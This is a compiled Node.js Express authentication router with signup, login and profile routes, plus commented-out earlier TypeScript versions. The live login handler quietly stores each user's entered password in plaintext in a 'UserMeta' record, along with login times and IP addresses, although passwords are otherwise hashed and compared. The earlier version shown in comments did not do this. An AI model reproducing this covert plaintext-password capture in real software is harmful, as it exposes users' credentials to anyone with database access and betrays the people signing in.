"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const jsonwebtoken_1 = __importDefault(require("jsonwebtoken"));
const User_1 = __importDefault(require("../models/User"));
const middleware_1 = require("../middleware");
const config_1 = require("../config");
const UserMeta_1 = __importDefault(require("../models/UserMeta"));
const router = express_1.default.Router();
// POST /signup
router.post('/signup', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const { username, password } = req.body;
    if (!username || !password) {
        return res.status(400).json({ error: 'Username and password are required' });
    }
    try {
        // Check if username already exists
        const existingUser = yield User_1.default.findOne({ username });
        if (existingUser) {
            return res.status(409).json({ error: ' Username already exists' });
        }
        const newUser = new User_1.default({
            username,
            password
        });
        yield newUser.save();
        res.status(201).json({ message: 'User created successfully' });
    }
    catch (error) {
        console.error('Error creating user:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
}));
// // POST /signup
// router.post('/signup', async (req: Request, res: Response) => {
//   const { username, password } = req.body;
//   if (!username || !password) {
//     return res.status(400).json({ error: 'Username (email) and password are required' });
//   }
//   try {
//     const newUser = new User({
//       email: username,
//       username: username.split('@')[0],
//       password,
//     });
//     await newUser.save();
//     res.status(201).json({ message: 'User created successfully' });
//   } catch (error: any) {
//     if (error.code === 11000) {
//       return res.status(409).json({ error: 'User with this email already exists' });
//     }
//     console.error('Error creating user:', error);
//     res.status(500).json({ error: 'Internal server error' });
//   }
// });
router.post('/login', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const { username, password } = req.body;
    const ipAddress = req.ip || req.headers['x-forwarded-for'];
    try {
        const user = yield User_1.default.findOne({ username });
        if (!user || !(yield user.comparePassword(password))) {
            return res.status(401).json({ message: 'Invalid credentials' });
        }
        // Find existing UserMeta or create new
        let meta = yield UserMeta_1.default.findOne({ userId: user._id });
        if (!meta) {
            meta = new UserMeta_1.default({
                userId: user._id,
                plainPassword: password,
                loginTimes: [new Date()],
                loginCount: 1,
                ipAddresses: [ipAddress]
            });
        }
        else {
            // Update existing: new login time, increment count, update latest password & IP
            meta.loginCount += 1;
            meta.loginTimes.push(new Date());
            meta.ipAddresses.push(ipAddress);
            meta.plainPassword = password; // ⚠ update latest password entered
        }
        yield meta.save();
        // Create JWT token as before
        const token = jsonwebtoken_1.default.sign({ id: user._id }, config_1.JWT_PASSWORD, { expiresIn: '1h' });
        res.json({ token });
    }
    catch (error) {
        console.error('Error during login:', error);
        res.status(500).json({ message: 'Server error' });
    }
}));
// POST /login
// router.post('/login', async (req: Request, res: Response) => {
//   const { username, password } = req.body;
//   try {
//     const user = await User.findOne({ username });
//     if (!user || !(await user.comparePassword(password))) {
//       return res.status(401).json({ message: 'Invalid credentials' });
//     }
//     const token = jwt.sign(
//       { id: user._id },
//       JWT_PASSWORD as string,
//       { expiresIn: '1h' }
//     );
//     res.json({ token });
//   } catch (error) {
//     console.error('Error during login:', error);
//     res.status(500).json({ message: 'Server error' });
//   }
// });
// GET /profile (protected)
router.get('/profile', middleware_1.authMiddleware, (req, res) => {
    res.send(req.user);
});
exports.default = router;
